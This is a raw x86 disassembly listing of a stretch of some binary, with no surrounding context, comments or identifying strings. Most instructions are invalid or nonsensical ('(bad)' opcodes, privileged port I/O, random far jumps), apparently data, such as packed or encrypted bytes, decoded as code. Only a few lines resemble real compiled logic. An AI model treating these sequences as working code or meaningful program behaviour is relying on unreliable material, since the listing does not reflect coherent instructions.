  40799a:	push   ebp
  40799c:	in     al,0x68
  40799e:	xchg   esp,eax
  40799f:	mov    bl,BYTE PTR ds:0xd38595c9
  4079a5:	shr    BYTE PTR [ebx+ecx*8+0x7c6c0722],1
  4079ac:	(bad)  
  4079ad:	out    dx,al
  4079ae:	aaa    
  4079af:	hlt    
  4079b0:	pop    ss
  4079b1:	fisttp DWORD PTR [eax+0x70]
  4079b4:	(bad)  
  4079b5:	jmp    0x4994:0xd258834f
  4079bc:	push   ebp
  4079bd:	and    eax,0x25cd05d8
  4079c2:	pop    ss
  4079c3:	mov    ch,0x28
  4079c5:	vhaddps xmm7,xmm3,xmm5
  4079c9:	jecxz  0x407a31
  4079cb:	arpl   bp,bp
  4079cd:	lods   eax,DWORD PTR ds:[esi]
  4079ce:	ss xchg esi,eax
  4079d0:	or     eax,0xc531be26
  4079d5:	out    dx,al
  4079d6:	ins    BYTE PTR es:[edi],dx
  4079d7:	and    DWORD PTR [eax-0x1e919bb3],edx
  4079dd:	test   BYTE PTR [ebx-0x73],bh
  4079e0:	(bad)  
  4079e1:	cli    
  4079e2:	sti    
  4079e3:	jmp    0xb77b:0x89d2ef30
  4079ea:	push   ebp
  4079eb:	inc    eax
  4079ec:	mov    edi,0x11b1c7f4
  4079f1:	inc    ebp
  4079f2:	and    eax,0xbbdde7cb
  4079f7:	(bad)  
  4079f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079f9:	add    BYTE PTR [esi+0xb],0xd8
  4079fd:	pop    edx
  4079fe:	mov    esi,0x3be5e722
  407a03:	ja     0x407a0d
  407a05:	out    0xa,eax
  407a07:	icebp  
  407a08:	jno    0x40799c
  407a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a0c:	shl    BYTE PTR [ebp+0x24625a8d],cl
  407a12:	add    cl,bl
  407a14:	cmp    BYTE PTR [edi+edx*2-0x5aeaf994],al
  407a1b:	daa    
  407a1c:	mov    BYTE PTR [ebx],0x1
  407a1f:	inc    ebp
  407a20:	jl     0x4079f0
  407a22:	out    0xb3,al
  407a24:	cwde   
  407a25:	pop    edi
  407a26:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  407a28:	div    DWORD PTR [ebx+esi*4+0x3dc7898e]
  407a2f:	and    al,0xa9
  407a31:	sbb    al,0xc
  407a33:	aad    0xa4
  407a35:	and    al,0xce
  407a37:	xchg   ebp,eax
  407a38:	ja     0x407a7f
  407a3a:	xor    ah,cl
  407a3c:	repz (bad) 
  407a3e:	out    dx,al
  407a3f:	pop    ss
  407a40:	inc    ebp
  407a41:	xor    dl,BYTE PTR [edx]
  407a43:	scas   eax,DWORD PTR es:[edi]
  407a44:	or     DWORD PTR [ebp+0x740497af],ebx
  407a4a:	add    BYTE PTR [eax-0x70],cl
  407a4d:	jae    0x4079db
  407a4f:	mov    dh,0x1d
  407a51:	push   es
  407a52:	mov    ds:0x6295e1ae,al
  407a57:	mov    bl,0x2d
  407a59:	loopne 0x407a1e
  407a5b:	inc    edx
  407a5c:	pop    ecx
  407a5d:	push   ds
  407a5e:	hlt    
  407a5f:	retf   
  407a60:	inc    ecx
  407a61:	fcom   QWORD PTR [esi-0x33]
  407a64:	push   edi
  407a65:	ret    0x3193
  407a68:	mov    esi,0x3c92b75f
  407a6d:	inc    eax
  407a6e:	mov    esi,0x91eaaab3
  407a73:	pop    esp
  407a74:	mov    DWORD PTR ds:[edi-0x6],ebp
  407a78:	cli    
  407a79:	sub    eax,0x338cfdc4
  407a7e:	in     eax,dx
  407a7f:	rol    ah,0xe9
  407a82:	inc    ebp
  407a83:	pop    edx
  407a84:	adc    DWORD PTR [ebx-0x721c77a1],ebx
  407a8a:	stc    
  407a8b:	test   BYTE PTR [eax],dl
  407a8d:	test   DWORD PTR [ecx+0x48],0xe4b176e3
  407a94:	fs pop es
  407a96:	jmp    0x407a40
  407a98:	(bad)  
  407a9a:	cwde   
  407a9b:	xchg   esp,eax
  407a9c:	dec    esi
  407a9d:	add    DWORD PTR [ebx-0x3544e645],esp
  407aa3:	adc    bl,al
  407aa5:	ds loope 0x407ada
  407aa8:	push   esi
  407aa9:	sub    BYTE PTR [ebp-0x4d5fc82b],bh
  407aaf:	and    DWORD PTR [ebx+0x1a],ebp
  407ab2:	mov    ds:0x609ec349,eax
  407ab7:	test   BYTE PTR [ebx],0xdc
  407aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407abb:	and    BYTE PTR [ebx+edi*8+0x1211e9ac],ch
  407ac2:	pop    eax
  407ac3:	jae    0x407afc
  407ac5:	adc    dl,ah
  407ac7:	or     BYTE PTR [edx+ebx*2+0x4446b922],dl
  407ace:	or     dl,BYTE PTR [edi]
  407ad0:	bound  edi,QWORD PTR [edi]
  407ad2:	or     bl,BYTE PTR [esi]
  407ad4:	mov    edi,0xd4c7c224
  407ad9:	(bad)  
  407adb:	inc    ebp
  407adc:	iret   
  407add:	mov    al,ds:0x1fe07378
  407ae2:	imul   ebx,DWORD PTR [ecx-0x29ed9fb1],0x31
  407ae9:	stos   DWORD PTR es:[edi],eax
  407aea:	xchg   edx,eax
  407aeb:	xchg   edx,eax
  407aec:	push   es
  407aed:	mov    ecx,0xce150aae
  407af2:	sub    BYTE PTR [edx+0x1d],dl
  407af5:	cmp    al,0x4e
  407af7:	or     al,0x29
  407af9:	sbb    BYTE PTR [ebx-0x3b2955c3],bl
  407aff:	scas   eax,DWORD PTR es:[edi]
  407b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b01:	xchg   ebx,eax
  407b02:	inc    edx
  407b03:	and    ecx,esp
  407b05:	mov    WORD PTR [edi-0x22f625b4],fs
  407b0b:	pop    ss
  407b0c:	adc    edx,DWORD PTR [ecx+0x3]
  407b0f:	cs in  eax,dx
  407b11:	clc    
  407b12:	adc    eax,0xc633c625
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	cmp    ecx,DWORD PTR [ecx-0x36a88b5d]
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407afc
  407b4c:	inc    eax
  407b4d:	sub    al,0x46
  407b4f:	inc    ebp
  407b50:	pop    eax
  407b51:	(bad)  
  407b52:	lea    esp,[esi]
  407b54:	je     0x407bcd
  407b56:	fs dec ecx
  407b58:	outs   dx,DWORD PTR ds:[esi]
  407b59:	aaa    
  407b5a:	dec    edx
  407b5b:	rcr    DWORD PTR [eax],0x8e
  407b5e:	pusha  
  407b5f:	sub    edi,DWORD PTR [eax+edx*2+0x44]
  407b63:	adc    ah,bh
  407b65:	push   ebp
  407b66:	repnz mov esi,0xe3083bbd
  407b6c:	daa    
  407b6d:	pop    edx
  407b6e:	jbe    0x407ba8
  407b70:	mov    edx,cs
  407b72:	or     al,0x6e
  407b74:	bound  esi,QWORD PTR [ecx]
  407b76:	mov    bh,0x51
  407b78:	aam    0x7f
  407b7a:	ret    
  407b7b:	mov    bl,BYTE PTR [ecx-0x7b]
  407b7e:	scas   al,BYTE PTR es:[edi]
  407b7f:	(bad)  
  407b81:	adc    ebx,DWORD PTR [ebx]
  407b83:	cmp    edx,edx
  407b85:	add    al,0xa6
  407b87:	jns    0x407bb0
  407b89:	push   edi
  407b8a:	rol    BYTE PTR [edx-0x6a],1
  407b8d:	push   eax
  407b8e:	hlt    
  407b8f:	or     ch,BYTE PTR [esi+edi*1]
  407b92:	ss xchg edi,eax
  407b94:	mov    ch,ch
  407b96:	cmp    DWORD PTR [edx+0x4],eax
  407b99:	mov    eax,0x3447eb0c
  407b9e:	mov    ch,0x13
  407ba0:	jmp    DWORD PTR [eax-0xcab5a72]
  407ba6:	jecxz  0x407b53
  407ba8:	inc    ebp
  407ba9:	sbb    BYTE PTR [ebp-0x459c19ea],ah
  407baf:	lods   eax,DWORD PTR ds:[esi]
  407bb0:	sbb    al,BYTE PTR [esi]
  407bb2:	jbe    0x407bad
  407bb4:	and    DWORD PTR [edx-0x25],ebp
  407bb7:	fcomp  DWORD PTR [esi+0x7d]
  407bba:	mov    ch,0x94
  407bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bbd:	fsubr  DWORD PTR [eax+0x80e0708]
  407bc3:	mov    eax,ds:0x367780f1
  407bc8:	push   ebx
  407bc9:	in     al,0x45
  407bcb:	lahf   
  407bcc:	jns    0x407bd9
  407bce:	or     dl,BYTE PTR [edx]
  407bd0:	mov    dl,0xcc
  407bd2:	push   cs
  407bd3:	out    0x4a,eax
  407bd5:	jno    0x407b6d
  407bd7:	test   DWORD PTR [edi+0x5bbeba5d],edi
  407bdd:	xchg   ebx,eax
  407bde:	xor    dh,0xc3
  407be1:	(bad)  
  407be2:	mov    bl,0x5b
  407be4:	mov    ds:0xd567c7cc,eax
  407be9:	stos   BYTE PTR es:[edi],al
  407bea:	dec    eax
  407beb:	gs jbe 0x407c44
  407bee:	ins    DWORD PTR es:[edi],dx
  407bef:	std    
  407bf0:	inc    ebp
  407bf1:	push   ebx
  407bf2:	xor    eax,0xd673d666
  407bf7:	ret    0x7cb6
  407bfa:	stos   DWORD PTR es:[edi],eax
  407bfb:	rcr    BYTE PTR [edx+eiz*4+0x5c0f6a2a],1
  407c02:	cmc    
  407c03:	bnd jmp 0x407ba2
  407c06:	and    dh,0xe2
  407c09:	cmp    BYTE PTR [ebx+ecx*1],0x40
  407c0d:	pop    esi
  407c0e:	shl    DWORD PTR [esi*1+0x1abdcbaa],0x61
  407c16:	cmp    BYTE PTR [ecx-0x18],dl
  407c19:	push   ebx
  407c1a:	cmp    DWORD PTR [ecx+edi*2-0x49],0x90e8f8ec
  407c22:	out    dx,al
  407c23:	lea    ebp,[ebp+0x3f90e76c]
  407c29:	retf   
  407c2a:	sub    BYTE PTR [ebp-0x64],ch
  407c2d:	or     DWORD PTR [edx+ebp*2],ecx
  407c30:	pop    edx
  407c31:	lods   eax,DWORD PTR ds:[esi]
  407c32:	call   0x883b:0x837af8f4
  407c39:	iret   
  407c3a:	adc    BYTE PTR [eax],0x5e
  407c3d:	test   DWORD PTR [eax+0x58],ebx
  407c40:	adc    BYTE PTR [edi+0x5a],bl
  407c43:	cmp    BYTE PTR [ecx],dl
  407c45:	xchg   esi,eax
  407c46:	pop    ecx
  407c47:	jmp    0x407cc7
  407c49:	sub    al,0x89
  407c4b:	mov    dl,ch
  407c4d:	or     eax,0xb6119670
  407c52:	aas    
  407c53:	inc    edx
  407c54:	push   ecx
  407c55:	mov    dl,0xf9
  407c57:	ret    
  407c58:	inc    esi
  407c59:	test   al,0x15
  407c5b:	clc    
  407c5c:	jo     0x407c9f
  407c5e:	sub    eax,DWORD PTR [ebp-0x31]
  407c61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c62:	inc    edi
  407c63:	dec    ecx
  407c64:	jg     0x407ce0
  407c66:	pop    es
  407c67:	es mov ebp,0xb5c5e69b
  407c6d:	mov    eax,ds:0xceab19b4
  407c72:	pop    ds
  407c73:	out    0xea,eax
  407c75:	and    dl,bh
  407c77:	and    ch,BYTE PTR [eax-0x20594318]
  407c7d:	fwait
  407c7e:	loopne 0x407c66
  407c80:	les    ecx,FWORD PTR ds:0x34447a6d
  407c86:	mov    esi,0x93ea9acf
  407c8b:	xchg   edx,eax
  407c8c:	xor    eax,0x18d32826
  407c91:	xor    eax,0xc988ae37
  407c96:	adc    al,0xfa
  407c98:	rcr    DWORD PTR [edx],cl
  407c9a:	add    ebp,DWORD PTR [edi]
  407c9c:	mov    dl,0xe
  407c9e:	lds    edx,FWORD PTR [edx+0x57]
  407ca1:	xchg   edi,eax
  407ca2:	mov    al,ds:0x141514d8
  407ca7:	neg    DWORD PTR [esi]
  407ca9:	shl    BYTE PTR [edi+0x4577f7f5],0x6a
  407cb0:	dec    esp
  407cb1:	xchg   BYTE PTR [ebp*2+0x7df95155],dh
  407cb8:	out    0x1b,al
  407cba:	(bad)  
  407cbb:	popf   
  407cbc:	and    eax,0xf371b457
  407cc1:	pop    ebx
  407cc2:	dec    esp
  407cc3:	mov    ah,0x57
  407cc5:	cdq    
  407cc6:	ja     0x407c6e
  407cc8:	dec    ebp
  407cc9:	dec    ebx
  407cca:	jno    0x407c80
  407ccc:	cmp    bl,BYTE PTR [esi-0x36edc232]
  407cd2:	push   esi
  407cd3:	adc    eax,0xd00aef9c
  407cd8:	jecxz  0x407d2d
  407cda:	(bad)  
  407cdb:	mov    eax,ds:0x62b14713
  407ce0:	stos   DWORD PTR es:[edi],eax
  407ce1:	add    bl,BYTE PTR [ebx]
  407ce3:	nop
  407ce4:	loop   0x407ce6
  407ce6:	aas    
  407ce7:	xor    eax,0xdbc747a1
  407cec:	inc    edx
  407ced:	adc    edi,DWORD PTR [edi+0x54]
  407cf0:	sub    DWORD PTR [ecx],edx
  407cf2:	and    DWORD PTR ds:0x4bbe,ebp
  407cf7:	test   esp,esp
  407cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cfa:	or     BYTE PTR [ebp-0x63],cl
  407cfd:	jmp    eax
  407cff:	and    eax,DWORD PTR [edx+edi*2+0x767136e1]
  407d06:	cmp    eax,0xeed629f0
  407d0b:	mov    ebp,0x3dea744a
  407d10:	pop    edx
  407d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d12:	pop    eax
  407d13:	in     eax,dx
  407d14:	adc    BYTE PTR [ecx+esi*2-0x35555b53],ah
  407d1b:	call   0xe9e6:0xef78cbb3
  407d22:	mov    eax,ds:0x5a01ac05
  407d27:	test   al,0x16
  407d29:	or     dh,dl
  407d2b:	js     0x407d24
  407d2d:	pop    ebp
  407d2e:	(bad)  
  407d30:	ffreep st(7)
  407d32:	pop    esp
  407d33:	(bad)
  407d37:	or     DWORD PTR [eax-0x50249b9b],ebp
  407d3d:	mov    ?,WORD PTR [ebx+eiz*1-0x5c]
  407d41:	mov    ds:0x428032fc,eax
  407d46:	dec    edx
  407d47:	cwde   
  407d48:	retf   0x42aa
  407d4b:	mov    edi,0x2cfda6a5
  407d50:	stos   BYTE PTR es:[edi],al
  407d51:	ins    DWORD PTR es:[edi],dx
  407d52:	push   ebx
  407d53:	adc    ecx,esp
  407d55:	mov    edx,0xf1d738db
  407d5a:	cli    
  407d5b:	dec    ebx
  407d5c:	sub    al,0x1b
  407d5e:	bound  edi,QWORD PTR [ecx+0x4a]
  407d61:	imul   ebx,DWORD PTR [esi+0x27],0xf7729068
  407d68:	icebp  
  407d69:	gs pop esi
  407d6b:	mov    gs,WORD PTR [ebx]
  407d6d:	ret    0x21ec
  407d70:	add    eax,0xc3345d19
  407d75:	sbb    eax,0x368c476d
  407d7a:	cmp    DWORD PTR [ebx+0x33b8b065],0xfaf5e061
  407d84:	aaa    
  407d85:	cmp    al,0x63
  407d87:	mov    al,ds:0x1b62cc9
  407d8c:	icebp  
  407d8d:	ins    BYTE PTR es:[edi],dx
  407d8e:	out    0x49,eax
  407d90:	sub    al,0x72
  407d92:	inc    edi
  407d93:	int    0xa5
  407d95:	test   BYTE PTR [edx+0x664fa99e],ch
  407d9b:	jne    0x407df3
  407d9d:	adc    al,0xbb
  407d9f:	xor    eax,DWORD PTR [ecx+esi*2+0x24d1168d]
  407da6:	aas    
  407da7:	inc    eax
  407da8:	add    esi,DWORD PTR [ebx-0x69429e2e]
  407dae:	sub    eax,0x917d2ce1
  407db3:	jmp    0xe7aaff21
  407db8:	sub    edx,0x5ef79c3c
  407dbe:	dec    edx
  407dbf:	ret    0x7e91
  407dc2:	int    0xe7
  407dc4:	mov    BYTE PTR [ecx],ah
  407dc6:	push   edi
  407dc7:	sub    DWORD PTR [edx+ecx*8-0x69b6e8ba],eax
  407dce:	lea    ebp,[ecx-0x14a4ec5a]
  407dd4:	jb     0x407e33
  407dd6:	nop
  407dd7:	pop    esi
  407dd8:	add    DWORD PTR [ebx+0x222ebe3e],0xed5a5881
  407de2:	in     al,dx
  407de3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407de5:	rcl    DWORD PTR [ebx],0x49
  407de8:	hlt    
  407de9:	std    
  407dea:	xor    bh,dh
  407dec:	lds    eax,FWORD PTR [ebx-0x6e]
  407def:	enter  0x730a,0x76
  407df3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407df4:	lea    edx,[eax-0x22df1c23]
  407dfa:	add    eax,0x4e5a7725
  407dff:	mov    fs,ecx
  407e01:	scas   al,BYTE PTR es:[edi]
  407e02:	mov    DWORD PTR [ecx],0x412a1dec
  407e08:	jo     0x407e40
  407e0a:	jno    0x407dbf
  407e0c:	push   es
  407e0d:	mov    al,0x43
  407e0f:	pop    edx
  407e10:	xchg   esp,eax
  407e11:	or     ch,BYTE PTR [esi+0xb]
  407e14:	ud0    ebx,DWORD PTR [ebp-0x6df88108]
  407e1b:	jmp    DWORD PTR ss:[edx-0x721c1db1]
  407e22:	and    DWORD PTR [ebx+esi*4],edx
  407e25:	lods   al,BYTE PTR ds:[esi]
  407e26:	clc    
  407e27:	jbe    0x407e6b
  407e29:	pop    edi
  407e2a:	mov    WORD PTR [ecx],gs
  407e2c:	repnz adc BYTE PTR [ebx+esi*2-0x6a],ah
  407e31:	fwait
  407e32:	imul   eax,edx,0x4530e597
  407e38:	jg     0x407ea9
  407e3a:	jb     0x407dc1
  407e3c:	dec    eax
  407e3d:	xchg   edi,eax
  407e3e:	fisubr WORD PTR [edi]
  407e40:	ds add eax,0x3e5772f9
  407e46:	mov    ebx,0xbb9fccfb
  407e4b:	sbb    edx,ecx
  407e4d:	cwde   
  407e4e:	in     eax,dx
  407e4f:	(bad)
  407e52:	jg     0x407eab
  407e54:	popf   
  407e55:	shl    dl,cl
  407e57:	pop    ax
  407e59:	shl    BYTE PTR [edi+0x78],cl
  407e5c:	cmp    BYTE PTR [ebx+0x10],0xa4
  407e60:	sbb    eax,0xb212731e
  407e65:	nop
  407e66:	call   0x5708:0x50059185
  407e6d:	test   eax,0x2163b372
  407e72:	int3   
  407e73:	(bad)  
  407e74:	mov    al,0xb8
  407e76:	add    al,bh
  407e78:	dec    edx
  407e79:	(bad)  
  407e7a:	jmp    0x407e64
  407e7c:	cmp    esp,DWORD PTR [edx+0x45890000]
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	bound  ebp,QWORD PTR [esp+eax*4+0x70d507c1]
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407ec9
  407ea5:	push   esp
  407ea6:	or     esi,DWORD PTR [edx]
  407ea8:	inc    edi
  407ea9:	or     BYTE PTR [ecx-0x7b],al
  407eac:	retf   
  407ead:	sub    esi,DWORD PTR [ebp-0x5a]
  407eb0:	mov    edx,0x21ff1c47
  407eb5:	push   esp
  407eb6:	mov    ebx,0xd714bb77
  407ebb:	xor    eax,0x5910654f
  407ec0:	js     0x407ea4
  407ec2:	shr    BYTE PTR [ebp+ebp*1-0x3d9330e],cl
  407ec9:	fxtract 
  407ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ecc:	pushf  
  407ecd:	imul   ebp,DWORD PTR [esi+0x3f623c39],0xd4e580b
  407ed7:	sub    al,0xed
  407ed9:	out    0xf9,eax
  407edb:	ins    DWORD PTR es:[edi],dx
  407edc:	fwait
  407edd:	sbb    BYTE PTR [ecx+0xf],cl
  407ee0:	jns    0x407ebc
  407ee2:	mov    esp,0x19a3da6d
  407ee7:	jmp    DWORD PTR [ebp-0x1d]
  407eea:	popf   
  407eeb:	aaa    
  407eec:	test   al,0x60
  407eee:	retf   
  407eef:	mov    al,ds:0xfdb2633b
  407ef4:	adc    ebp,ecx
  407ef6:	mov    bl,dl
  407ef8:	xchg   BYTE PTR es:[edx-0xb],ah
  407efc:	add    esp,DWORD PTR [ecx-0x544a615b]
  407f02:	inc    eax
  407f03:	xchg   ecx,eax
  407f04:	cwde   
  407f05:	cmp    ah,BYTE PTR [edx-0x35]
  407f08:	imul   ecx,DWORD PTR [edx+0x1a],0xf15a292f
  407f0f:	add    eax,DWORD PTR [ebx+eax*2]
  407f12:	dec    ecx
  407f13:	push   edi
  407f14:	push   edx
  407f15:	add    al,0xef
  407f17:	cmp    bh,ah
  407f19:	pop    ecx
  407f1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f1b:	push   ebx
  407f1c:	arpl   WORD PTR [ebx+0x4ce2e7eb],cx
  407f22:	push   esi
  407f23:	out    dx,eax
  407f24:	inc    esp
  407f25:	xor    al,0xcc
  407f27:	cmp    al,0xd4
  407f29:	or     al,0xc3
  407f2b:	add    dh,BYTE PTR [ebx]
  407f2d:	mov    cl,0x64
  407f2f:	fld    TBYTE PTR [ecx]
  407f31:	fmul   st,st(2)
  407f33:	(bad)  [ebp+0x33]
  407f36:	pop    ecx
  407f37:	xchg   BYTE PTR ds:0xdda4c823,cl
  407f3d:	add    al,0x11
  407f3f:	aam    0xb5
  407f41:	mov    bh,BYTE PTR fs:[ebp+edx*4-0x32]
  407f46:	ret    0xe792
  407f49:	retf   
  407f4a:	test   BYTE PTR [ebp+0x68ee360a],dl
  407f50:	ins    DWORD PTR es:[di],dx
  407f52:	icebp  
  407f53:	xor    eax,0x1de9b833
  407f58:	xor    al,0x77
  407f5a:	sbb    dh,BYTE PTR [ecx-0x54]
  407f5d:	sub    bl,BYTE PTR [edx+0x79b7dc3e]
  407f63:	into   
  407f64:	dec    esp
  407f65:	xchg   esp,eax
  407f66:	or     BYTE PTR [edx],bl
  407f68:	out    dx,al
  407f69:	adc    bh,BYTE PTR [edi-0xc]
  407f6c:	call   0xecb7:0x8e11baae
  407f73:	bound  edi,QWORD PTR [esi+0x28296593]
  407f79:	stc    
  407f7a:	or     ch,BYTE PTR [edi-0x759f286d]
  407f80:	scas   eax,DWORD PTR es:[edi]
  407f81:	out    dx,eax
  407f82:	and    eax,0x3e43cd44
  407f87:	mov    edi,0xcaa9884a
  407f8c:	sub    DWORD PTR [edx-0x5cd90ba7],ebx
  407f92:	test   BYTE PTR [eax-0xc39453],al
  407f98:	mov    eax,0xbe3be3d
  407f9d:	gs ins BYTE PTR es:[edi],dx
  407f9f:	sbb    ch,bh
  407fa1:	test   al,0xee
  407fa3:	test   al,0x59
  407fa5:	add    al,0xf
  407fa7:	lods   eax,DWORD PTR es:[esi]
  407fa9:	mov    DWORD PTR [eax+0xa],edx
  407fac:	data16 aaa 
  407fae:	jae    0x407f53
  407fb0:	jmp    0x407f4d
  407fb2:	cmp    bl,BYTE PTR [edi-0x8bcec74]
  407fb8:	push   ebp
  407fb9:	add    al,0x4a
  407fbb:	ins    DWORD PTR es:[edi],dx
  407fbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fbd:	aad    0x50
  407fbf:	sub    cl,BYTE PTR [ebp+eiz*2-0x3]
  407fc3:	aad    0x53
  407fc5:	out    dx,eax
  407fc6:	and    BYTE PTR ds:0x194a6ba6,al
  407fcc:	ins    BYTE PTR es:[edi],dx
  407fcd:	shl    BYTE PTR [edx-0x29],1
  407fd0:	mov    ah,0x87
  407fd2:	inc    ebp
  407fd3:	test   BYTE PTR [eax+0xf],ah
  407fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fd7:	inc    esi
  407fd8:	out    dx,al
  407fd9:	test   DWORD PTR [esi+0x45],edx
  407fdc:	add    eax,0xc7af7322
  407fe1:	add    BYTE PTR [eax],cl
  407fe3:	cdq    
  407fe4:	xor    BYTE PTR [eax],al
  407fe6:	dec    edx
  407fe7:	dec    esi
  407fe8:	push   ebp
  407fe9:	fst    QWORD PTR [edx+0x3faa9e11]
  407fef:	push   ss
  407ff0:	fiadd  DWORD PTR [edi]
  407ff2:	xchg   edi,eax
  407ff3:	(bad)  
  407ff4:	cli    
  407ff5:	std    
  407ff6:	adc    dl,BYTE PTR ds:0x1cb098db
  407ffc:	xor    bh,0x47
  407fff:	fld    QWORD PTR [ebp+edi*1-0x3fac0da2]
  408006:	pop    esp
  408007:	fild   WORD PTR [ecx-0x20]
  40800a:	pop    ds
  40800b:	sbb    eax,0x91b02d43
  408010:	aaa    
  408011:	cli    
  408012:	add    dl,bh
  408014:	adc    BYTE PTR [esi-0x77],0x25
  408018:	mov    ebx,0x66a3bf91
  40801d:	ja     0x408052
  40801f:	jge    0x408068
  408021:	retf   0x5df6
  408024:	push   esp
  408025:	in     al,0x90
  408027:	out    0x54,eax
  408029:	xor    bl,dh
  40802b:	stos   DWORD PTR es:[edi],eax
  40802c:	mov    eax,ds:0x1c843406
  408031:	test   DWORD PTR [ecx-0x40],ecx
  408034:	loop   0x40800a
  408036:	out    0x41,al
  408038:	jns    0x407fe9
  40803a:	mov    dl,0x81
  40803c:	xor    DWORD PTR [ecx+0x6b],ebx
  40803f:	or     al,0xeb
  408041:	imul   ebx,DWORD PTR [ecx-0x247b576b],0xffffffd4
  408048:	ret    0x7d17
  40804b:	(bad)  
  40804c:	clc    
  40804d:	xchg   edi,eax
  40804e:	mov    edi,0xec3ffdf5
  408053:	into   
  408054:	out    dx,al
  408055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408056:	retf   0x4d00
  408059:	pop    ds
  40805a:	fist   DWORD PTR [ebx-0x39df73a]
  408060:	out    dx,eax
  408061:	inc    ecx
  408062:	in     eax,0xf4
  408064:	adc    eax,0xf5b082d
  408069:	popa   
  40806a:	and    al,0xdc
  40806c:	lock cmp BYTE PTR [eax-0x79897bef],cl
  408073:	push   ss
  408074:	mov    DWORD PTR [eax+0x14],0xfcdd80ae
  40807b:	push   ebx
  40807c:	clc    
  40807d:	xor    al,0xa
  40807f:	push   cs
  408080:	stos   DWORD PTR es:[edi],eax
  408081:	add    esp,DWORD PTR [eax+0x9a948f2]
  408087:	out    0x3c,eax
  408089:	js     0x408053
  40808b:	cmp    DWORD PTR [ecx+0x6ff66817],ebp
  408091:	pushf  
  408092:	ret    
  408093:	dec    ecx
  408094:	pop    ecx
  408095:	add    al,0x66
  408097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408098:	pop    edi
  408099:	cmp    eax,DWORD PTR [edi-0x8a88cba]
  40809f:	push   ebx
  4080a0:	popf   
  4080a1:	js     0x40811c
  4080a3:	mov    cl,BYTE PTR [ecx+eax*1+0x6b1310d3]
  4080aa:	stos   BYTE PTR es:[edi],al
  4080ab:	das    
  4080ac:	lods   eax,DWORD PTR ds:[esi]
  4080ad:	fbld   TBYTE PTR [esi]
  4080af:	out    dx,al
  4080b0:	fimul  DWORD PTR [eax]
  4080b2:	add    eax,0xa37a31ad
  4080b7:	stos   DWORD PTR es:[edi],eax
  4080b8:	je     0x40807c
  4080ba:	addr16 jle 0x40804b
  4080bd:	jl     0x408139
  4080bf:	imul   eax,DWORD PTR [ebx],0xfbbcd0af
  4080c5:	ret    
  4080c6:	(bad)  
  4080c7:	sbb    esp,DWORD PTR [ebp+0x2a]
  4080ca:	inc    ebx
  4080cb:	hlt    
  4080cc:	call   0xd79b39fa
  4080d1:	jae    0x4080d3
  4080d3:	add    al,0x71
  4080d5:	mov    eax,0x87a2be6b
  4080da:	lods   al,BYTE PTR ds:[esi]
  4080db:	cs mov dl,0x14
  4080de:	int3   
  4080df:	mov    cl,0xaf
  4080e1:	adc    DWORD PTR [eax+0x37],0x3ab80e3f
  4080e8:	ret    0x530f
  4080eb:	pop    ax
  4080ed:	adc    BYTE PTR [eax-0x48],bh
  4080f0:	mov    al,ds:0x76c70171
  4080f5:	jecxz  0x408167
  4080f7:	push   edi
  4080f8:	arpl   ax,cx
  4080fa:	xchg   esi,eax
  4080fb:	xor    BYTE PTR [ebp-0x53],dh
  4080fe:	out    0x89,al
  408100:	clc    
  408101:	repz add bp,WORD PTR [ebx]
  408105:	cwde   
  408106:	jne    0x408143
  408108:	mov    eax,es
  40810a:	fwait
  40810b:	inc    edi
  40810c:	ds and esi,ecx
  40810f:	dec    ebp
  408110:	gs jnp 0x4080db
  408113:	sub    DWORD PTR [esi-0x31],edx
  408116:	pop    ds
  408117:	sub    bh,BYTE PTR [edx+eiz*4]
  40811a:	scas   eax,DWORD PTR es:[edi]
  40811b:	int3   
  40811c:	ja     0x408126
  40811e:	rcr    ebx,0x8d
  408121:	push   edx
  408122:	jne    0x40819c
  408124:	std    
  408125:	add    BYTE PTR [eax-0x54f058fa],ah
  40812b:	dec    edi
  40812c:	and    al,0xcf
  40812e:	mov    ebx,0x51550816
  408133:	jbe    0x40818e
  408135:	into   
  408136:	pop    esp
  408137:	dec    edx
  408138:	push   es
  408139:	imul   ecx,DWORD PTR [ebx+ecx*2-0x61f2b94b],0xffffff8c
  408141:	aam    0x46
  408143:	(bad)  
  408145:	ins    BYTE PTR es:[edi],dx
